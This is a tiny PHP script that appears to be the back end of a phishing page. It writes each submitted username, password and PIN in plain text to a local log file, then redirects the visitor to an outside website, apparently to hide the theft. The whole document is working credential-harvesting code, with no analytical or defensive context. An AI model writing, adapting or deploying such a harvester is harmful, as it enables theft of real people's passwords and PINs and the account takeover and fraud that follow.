<?php

    file_put_contents("log.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " Pin: " . $_POST['pin'] . "\n", FILE_APPEND);
header('Location: https://skweezer.net');
exit();